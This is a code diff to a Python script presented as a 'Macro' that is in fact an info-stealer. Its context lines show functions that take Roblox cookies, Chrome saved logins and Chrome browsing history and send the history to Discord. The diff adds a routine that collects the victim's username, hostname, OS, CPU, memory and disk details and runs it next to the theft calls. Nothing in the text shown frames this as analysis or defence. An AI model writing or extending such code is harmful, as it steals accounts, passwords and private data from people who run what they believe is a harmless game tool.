@@ -340,24 +340,6 @@ def collect_chrome_logins():
     except:
         pass
 
-def get_size(bytes, suffix="B"):
-    factor = 1024
-    for unit in ["", "K", "M", "G", "T"]:
-        if bytes < factor:
-            return f"{bytes:.2f} {unit}{suffix}"
-        bytes /= factor
-
-def get_user_email():
-    try:
-        result = subprocess.run(
-            ["powershell", "-Command", "(Get-CimInstance -ClassName Win32_UserAccount | Where-Object {$_.LocalAccount -eq $false}).Name"],
-            capture_output=True, text=True
-        )
-        email = result.stdout.strip()
-        return email if email else "No Microsoft account email found"
-    except Exception as e:
-        return f"Error: {e}"
-
 def get_chrome_history(limit=100):
     original_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
     temp_path = os.path.join(tempfile.gettempdir(), "chrome_history_copy")
@@ -401,14 +383,49 @@ def generate_key(length=20):
     characters = string.ascii_uppercase + string.digits
     return ''.join(random.choice(characters) for _ in range(length))
 
+def get_size(bytes, suffix="B"):
+    factor = 1024
+    for unit in ["", "K", "M", "G", "T"]:
+        if bytes < factor:
+            return f"{bytes:.2f} {unit}{suffix}"
+        bytes /= factor
+
+def get_system_info():
+    print("=== SYSTEM INFORMATION ===")
+    print(f"Username: {getpass.getuser()}")
+    print(f"Computer Name: {socket.gethostname()}")
+    print(f"OS: {platform.system()} {platform.release()}")
+    print(f"Version: {platform.version()}")
+    print(f"Architecture: {platform.architecture()[0]}")
+    
+    # CPU info
+    print(f"Processor: {platform.processor()}")
+    print(f"Physical cores: {psutil.cpu_count(logical=False)}")
+    print(f"Total cores: {psutil.cpu_count(logical=True)}")
+    
+    # Memory info
+    svmem = psutil.virtual_memory()
+    print(f"Total RAM: {get_size(svmem.total)}")
+    print(f"Available RAM: {get_size(svmem.available)}")
+    
+    # Disk info
+    partitions = psutil.disk_partitions()
+    for partition in partitions:
+        try:
+            partition_usage = psutil.disk_usage(partition.mountpoint)
+            print(f"Disk {partition.device}: Total: {get_size(partition_usage.total)} | Free: {get_size(partition_usage.free)}")
+        except PermissionError:
+            continue
+
 if __name__ == "__main__":
     print("[*] Launching Macro...")
 
-    # Run only the stable functions (NO SYSTEM INFO)
+    # Run only the stable functions
     main()
     retrieve_roblox_cookies()
     collect_chrome_logins()
-
+    get_system_info()
+    
     # Browser history
     history = get_chrome_history(limit=100)
     status = send_history_to_discord(history)
